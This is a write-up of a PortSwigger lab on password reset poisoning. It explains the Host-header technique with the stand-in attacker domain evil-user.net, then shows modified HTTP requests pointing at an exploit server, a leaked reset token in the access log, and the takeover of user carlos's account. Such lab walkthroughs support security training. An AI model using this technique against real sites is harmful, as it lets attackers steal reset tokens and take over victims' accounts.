## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/442fb3cc-44f3-4c88-90cb-c59535686069)

## Overview :

**How to construct a password reset poisoning attack :**

If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

   1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use `evil-user.net`.

   2.  The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:
    `https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j`
   3.  If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server.
   4.  The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account.

## Solution :

We have a option to reset our password using the **Forgot password** functionality.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/371b8929-1cca-47c1-964b-ef180ed7df1b)

Now enter the username whose password which we want to reset . In this case it is *wiener*.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/16a8d583-d139-4ea3-898e-ba9260ab4169)

Intercept the request & send it to repeater.

```http
POST /forgot-password HTTP/2
Host: 0a6c007204c10dcb805e944e00870001.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://0a6c007204c10dcb805e944e00870001.web-security-academy.net
Connection: keep-alive
Referer: https://0a6c007204c10dcb805e944e00870001.web-security-academy.net/forgot-password
Cookie: session=wPueOrVb4Kc6J5JGFRrzh2hCGreNgeja; _lab=46%7cMCwCFGH6edwtkZ8B%2fHdkZJIYYpguNWKgAhQEq3cg0iAy2%2bjza7hreiZYabLOM8JPVAJo29FiRWS1vXDIipjXExO3G%2fhwXwkX%2bDn64BJG3rtcWI2UkWmxoAUnunm5irS74YoTzo8RHXc8iDPNOg4HgkVTCbJ9uQAYpJygBjtv0ZOxBFs%3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

csrf=MIGoPg4wUnVE1BC76Owk7LhvbQBBFSOj&username=wiener
```
When the request is forwarded, the user wiener receives a password reset link in his email.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2c6207d1-690a-43a6-9c32-a2c5e2694c1a)

### Password reset poisoning :

In the forgot-password request,

- Change **user=carlos**
- Change the **Host** header to our exploit server address - `exploit-0a2e00fd04300dd080e5935d012800d9.exploit-server.net/exploit`

The request now looks like this,

```http
POST /forgot-password HTTP/2
Host: exploit-0a2e00fd04300dd080e5935d012800d9.exploit-server.net/exploit
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@p6w5nk6wglwmgr3mkv6xti8gh7nyomd.oastify.com
.
.
.

csrf=MIGoPg4wUnVE1BC76Owk7LhvbQBBFSOj&username=carlos
```

Send the request . Now **carlos would have received a password reset mail which when clicked will send the reset token to our exploit server. We can access it via the access logs.**

```html
10.0.4.13       2023-10-16 07:07:41 +0000 "GET /exploit/forgot-password?temp-forgot-password-token=c3fafxu1agozldg7r512g3p9iq7nbpmi HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
```
From the access log, we got the reset token of carlos - `c3fafxu1agozldg7r512g3p9iq7nbpmi`

Now we can reset carlos's password using the link 

```html
https://0a6c007204c10dcb805e944e00870001.web-security-academy.net/forgot-password?temp-forgot-password-token=c3fafxu1agozldg7r512g3p9iq7nbpmi
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a29f0002-44b6-4c75-b368-fc524b158489)

Now we can login as carlos with the new password which we set.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5d771582-6e5c-4bdb-9b1d-c8fa9e64f1a7)

The lab is now solved.
